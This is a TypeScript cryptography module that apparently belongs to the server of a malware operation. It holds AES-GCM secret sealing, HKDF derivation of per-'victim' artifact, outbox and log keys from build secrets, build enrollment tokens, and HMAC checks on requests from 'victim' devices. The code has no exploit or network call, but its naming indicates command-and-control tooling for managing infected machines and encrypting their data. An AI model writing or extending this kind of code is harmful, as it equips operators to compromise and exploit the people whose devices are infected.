import { createCipheriv, createDecipheriv, createHash, createHmac, hkdfSync, randomBytes, timingSafeEqual } from 'node:crypto';
import { env } from './env';

const B64 = 'base64url';

export const sha256 = (data: Buffer | string): Buffer =>
  createHash('sha256').update(data).digest();
export const sha256hex = (data: Buffer | string): string => sha256(data).toString('hex');
export const hmac = (key: Buffer | string, data: Buffer | string): Buffer =>
  createHmac('sha256', key).update(data).digest();
export const b64u = (data: Buffer | string): string =>
  (Buffer.isBuffer(data) ? data : Buffer.from(data)).toString(B64);
export const unb64u = (value: string): Buffer => Buffer.from(value, B64);
export const randomToken = (bytes = 32): string => randomBytes(bytes).toString(B64);
export const randomId = (): string => randomBytes(16).toString('hex');

export function equal(a: Buffer | string, b: Buffer | string): boolean {
  const left = Buffer.isBuffer(a) ? a : Buffer.from(a);
  const right = Buffer.isBuffer(b) ? b : Buffer.from(b);
  return left.length === right.length && timingSafeEqual(left, right);
}

/** AES-256-GCM at rest. Format: v1.<b64u nonce>.<b64u ct>.<b64u tag>. */
export function sealSecret(plain: string): string {
  const nonce = randomBytes(12);
  const cipher = createCipheriv('aes-256-gcm', env.masterKey, nonce);
  const ct = Buffer.concat([cipher.update(plain, 'utf8'), cipher.final()]);
  return `v1.${b64u(nonce)}.${b64u(ct)}.${b64u(cipher.getAuthTag())}`;
}

export function openSecret(sealed: string): string {
  const [version, nonce, ct, tag] = sealed.split('.');
  if (version !== 'v1' || !nonce || !ct || !tag) throw new Error('sealed_format');
  for (const key of [env.masterKey, ...(env.masterKeyOld ? [env.masterKeyOld] : [])]) {
    try {
      const decipher = createDecipheriv('aes-256-gcm', key, unb64u(nonce));
      decipher.setAuthTag(unb64u(tag));
      return Buffer.concat([decipher.update(unb64u(ct)), decipher.final()]).toString('utf8');
    } catch {
      // try the previous key during rotation
    }
  }
  throw new Error('sealed_auth');
}

/** build_token = HMAC(build_secret, "enroll") truncated to 32 bytes, base64url. */
export function buildToken(buildSecret: string): string {
  return hmac(unb64u(buildSecret), 'enroll').subarray(0, 32).toString(B64);
}

export function buildTokenHash(buildSecret: string): string {
  return sha256hex(buildToken(buildSecret));
}

/** Scheme 2: the enrollment token is a labelled HKDF, never the artifact IKM. */
export function enrollTokenV2(buildSecret: string, buildId: string): string {
  const prk = Buffer.from(hkdfSync('sha256', unb64u(buildSecret), Buffer.from(buildId, 'utf8'),
    Buffer.from('SPC-ENROLL-V2'), 32));
  return prk.toString(B64);
}

export function enrollTokenHashV2(buildSecret: string, buildId: string): string {
  return sha256hex(enrollTokenV2(buildSecret, buildId));
}

/** Row may still be plaintext until the one-shot reseal runs. */
export function openSecretLoose(sealedOrPlain: string): string {
  return sealedOrPlain.startsWith('v1.') ? openSecret(sealedOrPlain) : sealedOrPlain;
}

/** Legacy or sealed build secret. Never logs the value. */
export function openBuildSecret(sealedOrPlain: string): string {
  return sealedOrPlain.startsWith('v1.') ? openSecret(sealedOrPlain) : sealedOrPlain;
}

/**
 * Epoch 1 keeps the original info string so 0.3.9 artifacts stay readable.
 * Later epochs append the counter; the label is the domain separation.
 */
export function epochInfo(label: string, victimId: string, epoch: number): Buffer {
  return Buffer.from(epoch > 1 ? `${label}-v2:${victimId}:${epoch}` : `${label}-v2:${victimId}`, 'utf8');
}

function epochKey(buildSecret: string, buildId: string, keySalt: Buffer, label: string, victimId: string, epoch: number): Buffer {
  if (keySalt.length < 16) throw new Error('artifact_key_salt');
  if (!Number.isInteger(epoch) || epoch < 1) throw new Error('key_epoch_invalid');
  const prk = Buffer.from(hkdfSync('sha256', unb64u(buildSecret), Buffer.from(buildId, 'utf8'),
    Buffer.from('SPC-ART-V2'), 32));
  return Buffer.from(hkdfSync('sha256', prk, keySalt, epochInfo(label, victimId, epoch), 32));
}

export function artifactKey(
  buildSecret: string,
  buildId: string,
  victimId: string,
  noncePrefix: Buffer,
  keySalt?: Buffer,
  scheme = 1,
  epoch = 1
): Buffer {
  if (scheme === 2) {
    if (!keySalt) throw new Error('artifact_key_salt');
    return epochKey(buildSecret, buildId, keySalt, 'artifact', victimId, epoch);
  }
  const ikm = Buffer.concat([
    Buffer.from(unb64u(buildSecret)),
    Buffer.from([0x1f]),
    Buffer.from(buildId, 'utf8'),
    Buffer.from([0x1f]),
    Buffer.from(victimId, 'utf8')
  ]);
  const kek = sha256(Buffer.concat([Buffer.from('SPC-ART-V1', 'utf8'), ikm]));
  return Buffer.from(hkdfSync('sha256', kek, noncePrefix, Buffer.from('artifact-v1'), 32));
}

/** Local-only keys. The server never stores outbox/log material. */
export function outboxKey(
  buildSecret: string,
  buildId: string,
  victimId: string,
  keySalt: Buffer,
  epoch: number
): Buffer {
  return epochKey(buildSecret, buildId, keySalt, 'outbox', victimId, epoch);
}

export function logKey(
  buildSecret: string,
  buildId: string,
  victimId: string,
  keySalt: Buffer,
  epoch: number
): Buffer {
  return epochKey(buildSecret, buildId, keySalt, 'log', victimId, epoch);
}

/** Non-reversible verifier carried in the container manifest, one per epoch. */
export function keyProbe(artifactKeyBytes: Buffer): string {
  return hmac(artifactKeyBytes, 'probe').toString(B64);
}

/** X-Signature verification per contract §2. `rawPath` excludes the query. */
export function victimCanonical(
  method: string,
  rawPath: string,
  timestamp: string,
  nonce: string,
  body: Buffer
): string {
  return [method.toUpperCase(), rawPath, timestamp, nonce, sha256hex(body)].join('\n') + '\n';
}

export function verifyVictim(
  deviceToken: string,
  method: string,
  rawPath: string,
  timestamp: string,
  nonce: string,
  body: Buffer,
  signature: string
): boolean {
  const expected = hmac(unb64u(deviceToken), victimCanonical(method, rawPath, timestamp, nonce, body));
  try {
    return equal(expected, unb64u(signature));
  } catch {
    return false;
  }
}

/** Accepts the active, previous and pending tokens of one device. */
export function verifyVictimAny(
  deviceTokens: string[],
  method: string,
  rawPath: string,
  timestamp: string,
  nonce: string,
  body: Buffer,
  signature: string
): boolean {
  const expected = victimCanonical(method, rawPath, timestamp, nonce, body);
  const given = (() => {
    try {
      return unb64u(signature);
    } catch {
      return Buffer.alloc(0);
    }
  })();
  if (given.length === 0) return false;
  // Compare every candidate: timing does not leak which token matched.
  let matched = false;
  for (const token of deviceTokens) {
    try {
      if (equal(hmac(unb64u(token), expected), given)) matched = true;
    } catch {
      // malformed stored token: try the next one
    }
  }
  return matched;
}

export function safeJson<T>(text: string, fallback: T): T {
  try {
    return JSON.parse(text) as T;
  } catch {
    return fallback;
  }
}
